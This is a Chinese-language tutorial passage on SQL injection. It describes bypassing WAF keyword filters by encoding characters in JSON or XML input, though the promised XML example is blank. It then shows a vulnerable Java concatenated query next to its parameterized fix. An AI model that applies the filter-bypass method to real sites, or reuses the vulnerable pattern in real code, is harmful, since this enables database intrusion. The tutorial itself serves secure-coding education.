在之前的实验中，你使用查询字符串注入了恶意的SQLpayload，但实际上，只要应用程序将可控输入作为SQL查询进行处理，你就能利用任何此类输入实施SQL注入攻击。例如，某些网站会接收JSON或XML格式的输入，并以此查询数据库。

这些不同的格式可能提供多种方式，是你能够混淆那些本会被WAF及其他防御机制拦截的攻击，弱实现通常会检测请求中是否存在常见的SQL注入关键词，因此你可通过对禁止关键词中的字符进行编码或转义来绕过这些过滤器，例如，以下是基于XML的SQL注入利用XML转义序列对字符串中的A字符进行编码：SELECT:





### 如何防止SQL注入？

通常使用参数化查询而非在查询中进行字符串拼接，可预防大多数SQL注入攻击。此类参数化查询也称为“预编译语句”

以下代码存在SQL注入漏洞，因为用户输入被直接拼接到查询语句中：

```
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

你可以重新写这段代码，使其能够防止用户输入干扰查询结构：

```
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

在任何需要处理查询中包含不可信输入数据的场景下，均可使用参数化查询，包括 `WHERE` 子句以及 `INSERT` `UPDATE` 语句中的值，但参数化查询无法处理查询其他部分的不可信输入，例如表名，列名和 `ORDER BY` 子句。

应用程序若需在这些查询中插入不可信数据，则需要采用其他方法：

- 允许输入值白名单
- 使用不同的逻辑来实现所需的行为

为了使参数化查询有效防止 SQL 注入，查询中使用的字符串必须始终是硬编码常量。它绝不能包含任何来源的变量数据。不要被逐案判断数据是否可信，对于被认为安全的案例，请继续在查询中使用字符串串接。很容易在数据来源或代码变更中出现错误，从而污染可信数据。